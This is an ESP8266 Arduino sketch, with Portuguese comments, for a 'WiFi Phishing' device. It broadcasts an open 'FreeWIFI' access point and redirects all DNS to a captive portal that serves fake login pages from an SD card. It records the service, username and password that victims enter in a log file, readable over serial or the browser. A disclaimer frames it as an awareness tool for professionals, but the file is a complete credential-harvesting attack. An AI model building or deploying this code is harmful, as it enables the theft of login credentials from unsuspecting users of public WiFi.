                                                                                                                                                           /*
  WiFi Phishing usando um ESP8266 + Leitor de Cartao SD
  para armazenamento dos arquivos do Servidor

  Os arquivos de configuracao sao:
  - SSID.TXT - Arquivo que gerencia os SSIDs
  - DATALOG.TXT - Arquivo responsavel pelo armazenamento das credenciais capturadas
  - INDEX.TXT - Arquivo que gerencia os modelos de Paginas de Login. Deve estar acompanhado de ERROR.TXT
  - ERROR.TXT - Arquivo que gerencia as paginas de retorno após Login. Deve estar acompanhado de INDEX.TXT
  - FILE.TXT - Lista de Arquivos no cartão SD
  - ERRO.TXT - Lista de arquivos para retorno

  Nao ha limite para quantidade de modelos

  O acesso aos logs pode ser feito via console serial ou via browser, conectando-se ao SSID criado, abrindo o endereco http://172.217.28.1/datalog.txt
  Criado em 1 Jan 2021 - por Leonardo La Rosa aka L2R1 - sp.leonardo@gmail.com

*/

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <SPI.h>
#include <SD.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define DNS_PORT 53
#define HTTP_PORT 80
#define SDCARD_CS_PIN SS
#define BLOCK_SSID_REQUEST
#define DEFAULT_SSID_PREFIX "FreeWIFI"
#define DEFAULT_HTML_PREFIX "portal.htm"
#define DEFAULT_ERROR_PREFIX  "erro1.htm"
#define AP_ADDRESS "172.217.28.1"
#define AP_NETMASK "255.255.255.0"
#define AP_CHANNEL 1
#define AP_MAX_CLIENTS 5
#define HOSTNAME "login"
#define FILENAME_SSID "ssid.txt"
#define FILENAME_HTML "index.txt"
#define FILENAME_ERROR "error.txt"
#define FILENAME_DATALOG "datalog.txt"
#define FILENAME_FILE "file.txt"

#define OLED_RESET 0  // GPIO0

Adafruit_SSD1306 display(OLED_RESET);

#define XPOS 0
#define YPOS 1
#define DELTAY 2

#if (SSD1306_LCDHEIGHT != 48)
#error("Height incorrect, please fix Adafruit_SSD1306.h!");
#endif

DNSServer dnsServer;
ESP8266WebServer server(HTTP_PORT);
int lastClientCount = -1;
String html = DEFAULT_HTML_PREFIX;
String error = DEFAULT_ERROR_PREFIX;
String ssid = DEFAULT_SSID_PREFIX;

// 'fotoefeitos', 64x48px
const unsigned char epd_bitmap_fotoefeitos [] PROGMEM = {
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xe0, 0x1f, 0xff, 0xff, 0xff, 
  0xff, 0xff, 0xff, 0x9f, 0xc7, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0xe3, 0xff, 0xff, 0xff, 
  0xff, 0xff, 0xfe, 0xff, 0xe1, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfd, 0xff, 0xc0, 0xff, 0xff, 0xff, 
  0xff, 0xff, 0xfd, 0xff, 0xc3, 0x7f, 0xff, 0xff, 0xff, 0xff, 0xf9, 0xff, 0xc7, 0x7f, 0xff, 0xff, 
  0xff, 0xff, 0xff, 0xff, 0x87, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0f, 0xff, 0xff, 0xff, 
  0xff, 0xff, 0xff, 0xff, 0x0f, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x07, 0xff, 0xff, 0xff, 
  0xff, 0xff, 0xff, 0xff, 0x81, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x3f, 0xff, 0xff, 
  0xff, 0xff, 0xf9, 0xf8, 0x20, 0x3f, 0xff, 0xff, 0xff, 0xff, 0xf9, 0xfc, 0x30, 0x3f, 0xff, 0xff, 
  0xff, 0xff, 0xf9, 0xfd, 0x38, 0x3f, 0xff, 0xff, 0xff, 0xff, 0xfd, 0xf9, 0xb8, 0x3f, 0xff, 0xff, 
  0xff, 0xff, 0xfd, 0xfb, 0xbc, 0x7f, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x23, 0xc8, 0x7f, 0xff, 0xff, 
  0xff, 0xff, 0xfb, 0x0f, 0xe1, 0xbf, 0xff, 0xff, 0xff, 0xff, 0xf9, 0xff, 0xff, 0xbf, 0xff, 0xff, 
  0xff, 0xff, 0xf9, 0xe0, 0x07, 0x3f, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x80, 0x00, 0x1f, 0xff, 0xff, 
  0xff, 0xff, 0xf8, 0x00, 0x00, 0x1f, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x01, 0x80, 0x1f, 0xff, 0xff, 
  0xff, 0xff, 0xf0, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x00, 0x00, 0x0f, 0xff, 0xff, 
  0xff, 0xff, 0xf0, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x00, 0x00, 0x0f, 0xff, 0xff, 
  0xff, 0xff, 0xf0, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x00, 0x00, 0x0f, 0xff, 0xff, 
  0xff, 0xff, 0xf8, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x1f, 0xff, 0xff, 
  0xff, 0xff, 0xfc, 0x00, 0x00, 0x1f, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x1f, 0xff, 0xff, 
  0xff, 0xff, 0xfc, 0x00, 0x00, 0x1f, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x00, 0x00, 0x3f, 0xff, 0xff, 
  0xff, 0xff, 0xfe, 0x00, 0x00, 0x3f, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x00, 0x00, 0x7f, 0xff, 0xff, 
  0xff, 0xff, 0xff, 0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x01, 0xff, 0xff, 0xff, 
  0xff, 0xff, 0xff, 0xc0, 0x03, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x07, 0xff, 0xff, 0xff, 
  0xff, 0xff, 0xff, 0xf8, 0x1f, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x3f, 0xff, 0xff, 0xff, 
  0xff, 0xff, 0xff, 0xfe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};

// Array of all bitmaps for convenience. (Total bytes used to store images in PROGMEM = 400)
const int epd_bitmap_allArray_LEN = 1;
const unsigned char* epd_bitmap_allArray[1] = {
  epd_bitmap_fotoefeitos
};






String input;
File myFile;
File root;
int cnt = 5;


void setup() {




  
      delay(1000);
      digitalWrite(2, LOW);
      Serial.begin(9600);
      digitalWrite(0, HIGH);
      display.begin(SSD1306_SWITCHCAPVCC, 0x3c);
      display.clearDisplay();
      display.setTextSize(0);
      display.setTextColor(WHITE);
      display.setCursor(0, 0);
      Serial.println();
      Serial.println(" _____    _____ __  _____  ");
      Serial.println("|     |  |     ||/ |     | ");
      Serial.println("|     |  |    _|  |  _    |");
      Serial.println("|     |  |      | | | |   |");
      Serial.println("|     |_ |     _| | |_|   |");
      Serial.println("|       ||       ||       |");
      Serial.println("|_______||_______| |_____| ");
      Serial.println(" __________________________");
      Serial.println("|                         |");
      Serial.println("|     WiFi Phishing       |");
      Serial.println("|    Leonardo La Rosa     |");
      Serial.println("|  sp.leonardo@gmail.com  |");
      Serial.println("|_________________________|");
      Serial.println();


display.drawBitmap(0, 0, epd_bitmap_fotoefeitos, 64, 48, WHITE);
display.display();
delay(2000);

     display.clearDisplay();
     display.setTextSize(0);
     display.setTextColor(WHITE);
     display.println("WiFi");
     display.println("Phishing");
     display.println("");
     display.println("by RL34075");
     display.display();

delay(2000);
display.clearDisplay();
display.setCursor(0,0);


      if (SD.begin(SDCARD_CS_PIN)) {
      } else {
        Serial.println("Falha ao iniciar o cartao SD");
        Serial.println("Sistema parado.");
        display.println("Erro no cartao");
        while (true);
      }

      String ssid = DEFAULT_SSID_PREFIX;
      if (SD.exists(FILENAME_SSID)) {
        File ssidFile = SD.open(FILENAME_SSID);
        ssid = ssidFile.readString();
        ssidFile.close();
        Serial.print("      SSID (ssid.txt) :  "); Serial.println(ssid);
        display.println(ssid);
      } else {
        Serial.print("      SSID (gerado): "); Serial.println(ssid);
        display.println(ssid);
      } 
          
      if (SD.exists(FILENAME_HTML)) {
        File htmlFile = SD.open(FILENAME_HTML);
        html = htmlFile.readString();
        htmlFile.close();
        if( html=="105"){
          html="portal.htm";}
        Serial.print("      HTML (index.txt):  "); Serial.println(html);
        display.println(html);
      } else {
        Serial.print("      HTML (gerado): "); Serial.println(html);
        display.println(html);
      }
    
      if (SD.exists(FILENAME_ERROR)) {
        File errorFile = SD.open(FILENAME_ERROR);
        error = errorFile.readString();
        errorFile.close();
        Serial.print("      Erro (error.txt):  "); Serial.println(error);
        display.println(error);
      } else {
        display.println(error);
        Serial.print("      Erro (gerado): "); Serial.println(error);
      }
    
      display.display();
    
      IPAddress ip, nm;
      ip.fromString(AP_ADDRESS);
      nm.fromString(AP_NETMASK);
  
      WiFi.mode(WIFI_AP);
      WiFi.softAPConfig(ip, ip, nm);
      WiFi.softAP(ssid.c_str(), "", AP_CHANNEL, false, AP_MAX_CLIENTS);

      File logFile = SD.open(FILENAME_DATALOG, FILE_WRITE);
      if (logFile) {
      } else {
        Serial.println("Falha ao gravar o arquivo de LOGS");
        Serial.println("Sistema parado.");
        while (true);
      }
      Serial.print("      Arquivo de Log  :  "); Serial.println("datalog.txt");
      Serial.print("\n");
    
      dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
      dnsServer.start(DNS_PORT, "*", ip);
      Serial.print("\n");
      server.on("/login.htm", handleLogin);
      server.on("/result.htm", handleResult);
      server.on("/", redirectToCaptivePortal);
      #ifdef BLOCK_DATALOG_REQUEST
      server.on(getUrlFromFileName(FILENAME_DATALOG), send404);
      #endif
      #ifdef BLOCK_SSID_REQUEST
      server.on(getUrlFromFileName(FILENAME_SSID), send404);
      #endif
      server.onNotFound(handleRequest);
      server.begin();
      Serial.println("\n");
      Serial.println("Tecle ? para ver a lista de comandos");
      Serial.println("\n\n");
  
      root = SD.open("/");
      printDirectory(root, 0);
}



void printDirectory(File dir, int numTabs) {
  String file = "";
  String erro = "";
  while (true) {
    File entry =  dir.openNextFile();
    if (! entry) {
      // no more files
      break;
    }
    if (String(entry.name()).endsWith("m")) {
      if (String(entry.name()).startsWith("e")) {
        erro += String(entry.name()) + "\n";
      } else {
        file += String(entry.name()) + "\n";
      }
    }
    entry.close();
  }
  //SD.remove("file.txt");
  //myFile = SD.open("file.txt", FILE_WRITE);
  //if (myFile) {
  //  myFile.println(file);
  //  myFile.close();

    //SD.remove("erro.txt");
    //myFile = SD.open("erro.txt", FILE_WRITE);
    //if (myFile) {
    //  myFile.println(erro);
    //  myFile.close();
    //}
  //}
}

void reset_config(void) {
  delay(3000);
  ESP.reset();
  ESP.reset();
}

void loop() {

  dnsServer.processNextRequest();
  server.handleClient();

  int currentClientCount = WiFi.softAPgetStationNum();
  if (lastClientCount != currentClientCount) {
    lastClientCount = currentClientCount;
    Serial.print("Connected clients: ");
    Serial.println(currentClientCount);
  }
  if (Serial.available()) {
    input = Serial.readStringUntil('\n');
    if (input.startsWith("?")) {
      Serial.println("\n\n\n\n\n\n\n\n\n\n\n\n");

      Serial.println("****************** Lista de Comandos *****************");
      Serial.println("*                                                    *");
      Serial.println("* T - Para ler os Termos de Uso da ferramenta        *");
      Serial.println("*                                                    *");
      Serial.println("* M<Modelo> - Para usar os modelos (Ex: MPortal.htm) *");
      Serial.println("*                                                    *");
      Serial.println("* E<Erro> - Para usar os modelos (Ex: EErro.htm)     *");
      Serial.println("*                                                    *");
      Serial.println("* S<SSID> - (Ex:SInternet ou SFree_WiFi)             *");
      Serial.println("*                                                    *");
      Serial.println("* L - Mostrar logs dos dados captrados               *");
      Serial.println("*                                                    *");
      Serial.println("* D - deleta os dados no arquivos de LOGS            *");
      Serial.println("*                                                    *");
      Serial.println("* C - Mostrar as configuracoes do sistema            *");
      Serial.println("*                                                    *");
      Serial.println("* A - Listar os arquivos do Cartao de memoria        *");
      Serial.println("*                                                    *");
      Serial.println("* R - Reiniciar dispositivo                          *");
      Serial.println("*                                                    *");
      Serial.println("* ? - Mostrar este Help com a lista de comandos      *");
      Serial.println("*                                                    *");
      Serial.println("******************************************************");

    }

    else if (input.startsWith("L")) {
      myFile = SD.open("datalog.txt");
      if (myFile) {
        while (myFile.available()) {
          Serial.write(myFile.read());
        }
        myFile.close();
      }
    }

    else if (input.startsWith("A")) {
      myFile = SD.open("file.txt");
      if (myFile) {
        while (myFile.available()) {
          Serial.write(myFile.read());
        }
        myFile.close();
      }

    }


    else if (input.startsWith("D")) {
      SD.remove("datalog.txt");
      myFile = SD.open("datalog.txt", FILE_WRITE);
      if (myFile) {
        myFile.println(" ");
        myFile.close();
        ESP.restart();
      }
    }

    else if (input.startsWith("T")) {
      Serial.print("\n\n");
      Serial.println("************************** ATENCAO *********************");
      Serial.println("*                                                      *");
      Serial.println("* Essa é uma ferramenta de CyberSeguranca desenvolvida *");
      Serial.println("* para profissionais da area que querem testar seus    *");
      Serial.println("* ambientes e conscientizar seus usuarios sobre o      *");
      Serial.println("* perigo do uso de internet gratuita.                  *");
      Serial.println("*                                                      *");
      Serial.println("* O autor nao se responsabiliza pelo uso inadequado    *");
      Serial.println("* da ferramenta e enfatiza a proibicao do seu uso em   *");
      Serial.println("* ambientes nao controlados.                           *");
      Serial.println("*                                                      *");
      Serial.println("* Ressalta tambem que a captura de dados de terceiros  *");
      Serial.println("* sem seu concentimento caracteriza crime conforme     *");
      Serial.println("* LEI Nº 12.737, de 30 de novembro de 2012.            *");
      Serial.println("*                                                      *");
      Serial.println("********************************************************");
    }

    else if (input.startsWith("C")) {
      Serial.print("\n\n");
      Serial.print("      Endereço IP    : "); Serial.println(AP_ADDRESS);
      Serial.print("      Endereçco MAC  : "); Serial.println(WiFi.softAPmacAddress());
      Serial.print("      Nome do Host   : "); Serial.println(HOSTNAME);
    }

    else if (input.startsWith("S")) {
      SD.remove("SSID.txt");
      myFile = SD.open("SSID.txt", FILE_WRITE);
      if (myFile) {
        myFile.println(input.substring(1));
        myFile.close();
        reset_config();
      }
    }

    else if (input.startsWith("M")) {
      SD.remove("index.txt");
      myFile = SD.open("index.txt", FILE_WRITE);
      if (myFile) {
        myFile.println(input.substring(1));
        myFile.close();
      }
      reset_config();
    }

    else if (input.startsWith("E")) {
      SD.remove("error.txt");
      myFile = SD.open("error.txt", FILE_WRITE);
      if (myFile) {
        myFile.println(input.substring(1));
        myFile.close();

      }
      reset_config();
    }

    else if (input.startsWith("R")) {
      reset_config();
    }

    else {
      Serial.println("\n\n");
      Serial.println("Comando Invalido");
    }
  }

}

void handleLogin() {
  // Save form data to text file
  File logFile = SD.open(FILENAME_DATALOG, FILE_WRITE);
  if (logFile) {
    String logLine = server.arg("svc");
    logLine += "\t" + server.arg("usr");
    logLine += "\t" + server.arg("pwd");
    Serial.println(logLine);
    logFile.println(logLine);
    logFile.close();
  } else {
    Serial.println("Error opening data file.");
  }

  // Redirect to error page
  String message = "<html><head><title>302 Found</title></head><body><a href=\"/error.htm\">Continue here</a></body></html>";
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.sendHeader("Location", "/" + error);
  server.send(302, "text/html", message);
}

void handleResult() {
  String validaSSID = server.arg("ssid");
  if (validaSSID != "") {
    SD.remove(FILENAME_SSID);
    myFile = SD.open(FILENAME_SSID, FILE_WRITE);
    if (myFile) {
      myFile.println(server.arg("ssid"));
      myFile.close();
    }

    String validaModelo = server.arg("modelo");
    if (validaModelo != "") {
      SD.remove(FILENAME_HTML);
      myFile = SD.open(FILENAME_HTML, FILE_WRITE);
      if (myFile) {
        myFile.println(server.arg("modelo"));
        myFile.close();
      }
    }

    String validaErro = server.arg("erro");
    if (validaErro != "") {
      SD.remove(FILENAME_ERROR);
      myFile = SD.open(FILENAME_ERROR, FILE_WRITE);
      if (myFile) {
        myFile.println(server.arg("erro"));
        myFile.close();
      }
    }

    // Redirect to error page
    String message = "<html><head><title>302 Found</title></head><body><a href=\"/error.htm\">Continue here</a></body></html>";
    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.sendHeader("Pragma", "no-cache");
    server.sendHeader("Expires", "-1");
    server.sendHeader("Location", "/" + error);
    server.send(302, "text/html", message);
  }
  reset_config();
}



void handleRequest() {
  if (server.hostHeader() != AP_ADDRESS) redirectToCaptivePortal();
  if (sendFileFromSD(server.uri())) return;
  send404();
}

void send404() {
  String message = "<html><head><title>404 Object Not Found</title></head><body><h1>404 Object Not Found</h1></body></html>";
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send(404, "text/html", message);
}

void redirectToCaptivePortal() {
  String location = "http://";
  location += AP_ADDRESS;
  location += "/";
  location += html;


String message = "<meta http-equiv='refresh' content='0; url="+location+"'>";
 //String message = "<html><meta http-equiv='refresh' content='5; url="+location+"'><head><title>302 Found</title></head><body><a href=\"" + location + "\">Continue here</a></body></html>";
 server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
 server.sendHeader("Pragma", "no-cache");
 server.sendHeader("Expires", "-1");
  server.send(302, "text/html", message);
 server.sendHeader("Location", location);
 return;
}


bool sendFileFromSD(String path) {
  if (path.endsWith("/")) path += html;
  String dataType = "application/octet-stream";
  if (path.endsWith(".htm")) {
    dataType = "text/html";
  } else if (path.endsWith(".css")) {
    dataType = "text/css";
  } else if (path.endsWith(".js")) {
    dataType = "application/javascript";
  } else if (path.endsWith(".png")) {
    dataType = "image/png";
  } else if (path.endsWith(".gif")) {
    dataType = "image/gif";
  } else if (path.endsWith(".jpg")) {
    dataType = "image/jpeg";
  } else if (path.endsWith(".ico")) {
    dataType = "image/x-icon";
  } else if (path.endsWith(".txt")) {
    dataType = "text/plain";
  }

    File dataFile = SD.open(path.c_str());
     if (dataFile.isDirectory()) {
      path += "/";
      path += html;
      dataType = "text/html";
      dataFile = SD.open(path.c_str());
  }

  if (!dataFile) return false;
  server.streamFile(dataFile, dataType);
  dataFile.close();
  return true;
}

const char* getUrlFromFileName(const char* fileName) {
  String url = "/";
  url += fileName;
  return url.c_str();
  }
